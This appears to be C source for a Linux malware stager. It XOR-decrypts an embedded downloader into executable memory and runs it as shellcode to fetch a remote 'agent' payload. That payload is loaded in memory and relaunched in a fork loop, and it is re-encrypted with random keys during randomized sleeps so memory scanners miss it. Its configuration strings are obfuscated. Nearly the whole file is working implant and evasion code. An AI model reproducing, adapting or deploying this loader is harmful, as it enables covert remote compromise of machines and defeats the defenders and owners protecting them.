#define _GNU_SOURCE
#include "elf_loader.h"
#include "utils.h"
#include "downloader_api.h"
#include "downloader_blob.h" // Generated at build time

/* Configurable Options - XOR-encoded byte arrays to hide strings */
#ifndef CONFIG_XOR_KEY
#define CONFIG_XOR_KEY 0x5A
#endif

// XOR-encoded configuration arrays
// We only need module_path here for stomping
// encoded_host/port/path/key are in downloader

// Forward declarations
static void decode_config_string(char *dest, const unsigned char *encoded, size_t max_len);
void xor_payload(char *data, size_t len, const uint8_t *key, size_t key_len);

static volatile int g_trap_requested = 0;
static void sigtrap_handler(int signo) {
  (void)signo;
  g_trap_requested = 1;
}

void stager_main(long *sp);

__asm__(".section .init,\"ax\",@progbits\n"
        ".global _start\n"
        "_start:\n"
        "xor %rbp, %rbp\n"
        "mov %rsp, %rdi\n"
        "and $0xfffffffffffffff0, %rsp\n"
        "call stager_main\n"
        "mov $60, %rax\n"
        "xor %rdi, %rdi\n"
        "syscall\n");

void stager_main(long *sp) {
  long argc = *sp;
  char **argv = (char **)(sp + 1);
  char **envp = argv + argc + 1;

  char module_path[256] = {0};
  
#ifdef ENCODED_MODULE_PATH
  static const unsigned char encoded_module_path[] = {ENCODED_MODULE_PATH};
  decode_config_string(module_path, encoded_module_path, sizeof(module_path));
#endif

  // Setup signal handler
  struct sigaction trap_sa;
  memset(&trap_sa, 0, sizeof(trap_sa));
  trap_sa.sa_handler = sigtrap_handler;
  sigemptyset(&trap_sa.sa_mask);
  sigaction(SIGTRAP, &trap_sa, NULL);

  // 1. Prepare Downloader
  // Map memory for downloader blob
  void *dl_mem = mmap(NULL, downloader_bin_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dl_mem == MAP_FAILED) exit(1);
  
  memcpy(dl_mem, downloader_bin, downloader_bin_len);
  
  // Decrypt Downloader (XOR with downloader_key defined in blob header)
  xor_payload((char *)dl_mem, downloader_bin_len, downloader_key, 16);

  // Load Downloader ELF
  size_t dl_base = 0;
  size_t dl_entry_addr = 0;
  size_t dl_mapped_size = 0;
  char dl_module_path[256] = {0};
  
#ifdef ENCODED_LIB_PATH
  static const unsigned char encoded_lib_path[] = {ENCODED_LIB_PATH};
  decode_config_string(dl_module_path, encoded_lib_path, sizeof(dl_module_path));
#endif

  // Map memory for Downloader (shellcode)
  // We need page-aligned memory for mprotect
  size_t dl_map_len = (downloader_bin_len + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
  void *dl_exec = (void *)mmap(NULL, dl_map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dl_exec == MAP_FAILED) exit(1);
  
  // Copy and decode downloader
  unsigned char *dl_ptr = (unsigned char *)dl_exec;
  for (int i = 0; i < downloader_bin_len; i++) {
    dl_ptr[i] = downloader_bin[i] ^ downloader_key[i % 16];
  }

  // Run Downloader
  typedef void (*dl_func)(struct download_result *);
  dl_func dl_entry = (dl_func)dl_exec;
  
  struct download_result res = {0};
  dl_entry(&res);

  // Cleanup Downloader
  memset(dl_exec, 0, dl_map_len);
  munmap(dl_exec, dl_map_len);

  if (!res.data || res.size == 0) exit(1);

  // 2. Load Agent
  char *final_payload = res.data;
  
  // PIE Check
  Elf_Ehdr *hdr = (Elf_Ehdr *)final_payload;
  if (hdr->e_type == ET_DYN) {
      // PIE
      size_t min_vaddr = 0, max_vaddr = 0;
      if (elf_get_memory_bounds(final_payload, &min_vaddr, &max_vaddr) != 0) exit(1);
      size_t map_len = max_vaddr - min_vaddr;
      
      // Map shared memory in parent
      void *shared_mem = (void *)mmap(NULL, map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
      if (shared_mem == MAP_FAILED) exit(1);

      // PIE: Restart loop
      uint8_t rotator_key[16] = {0};
      while (1) {
          long pid = fork();
          if (pid == 0) {
              // Child
              // elf_run will handle loading and relocation into shared_mem
              elf_run(final_payload, argv, envp, 1, module_path, (size_t)shared_mem);
              exit(0);
          } else if (pid > 0) {
              // Parent: wait for child to exit
              int status = 0;
              long res = waitpid((int)pid, &status, 0);
              if (res != pid) break;
              if (g_trap_requested) break;
              
              // Child exited, rotate payload
              getrandom(rotator_key, 16, 0);
              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
              
              // Sleep with configurable range
              unsigned int sleep_s = 0;
              getrandom(&sleep_s, sizeof(sleep_s), 0);
              unsigned int sleep_range = SLEEP_MAX - SLEEP_MIN;
              sleep_s = SLEEP_MIN + (sleep_s % sleep_range);
              struct timespec req = {sleep_s, 0};
              nanosleep(&req, NULL);
              
              // Unrotate payload and restart
              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
              // Loop continues to fork again
          } else {
              break;
          }
      }
  } else {
      // Static (Shared Memory Rotation)
      size_t min_vaddr = 0, max_vaddr = 0;
      if (elf_get_memory_bounds(final_payload, &min_vaddr, &max_vaddr) != 0) exit(1);
      
      size_t map_len = max_vaddr - min_vaddr;
      void *shared_mem = (void *)mmap((void *)min_vaddr, map_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
      if (shared_mem == MAP_FAILED) exit(1);

      // Static: Restart loop
      uint8_t rotator_key[16] = {0};
      while (1) {
          long pid = fork();
          if (pid == 0) {
              elf_run(final_payload, argv, envp, 1, module_path, 0);
              exit(0);
          } else if (pid > 0) {
              // Parent: wait for child to exit
              int status = 0;
              long res = waitpid((int)pid, &status, 0);
              if (res != pid) break;
              if (g_trap_requested) break;
              
              // Child exited, rotate payload
              getrandom(rotator_key, 16, 0);
              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
              
              // Sleep with configurable range
              unsigned int sleep_s = 0;
              getrandom(&sleep_s, sizeof(sleep_s), 0);
              unsigned int sleep_range = SLEEP_MAX - SLEEP_MIN;
              sleep_s = SLEEP_MIN + (sleep_s % sleep_range);
              struct timespec req = {sleep_s, 0};
              nanosleep(&req, NULL);
              
              // Unrotate payload and restart
              xor_payload((char *)shared_mem, map_len, rotator_key, 16);
              // Loop continues to fork again
          } else {
              break;
          }
      }
  }
  exit(0);
}

void xor_payload(char *data, size_t len, const uint8_t *key, size_t key_len) {
  for (size_t i = 0; i < len; i++) {
    data[i] ^= key[i % key_len];
  }
}

static void decode_config_string(char *dest, const unsigned char *encoded, size_t max_len) {
  size_t i = 0;
  while (i < max_len - 1) {
    if (encoded[i] == 0x00) break;
    dest[i] = encoded[i] ^ CONFIG_XOR_KEY;
    i++;
  }
  dest[i] = '\0';
}
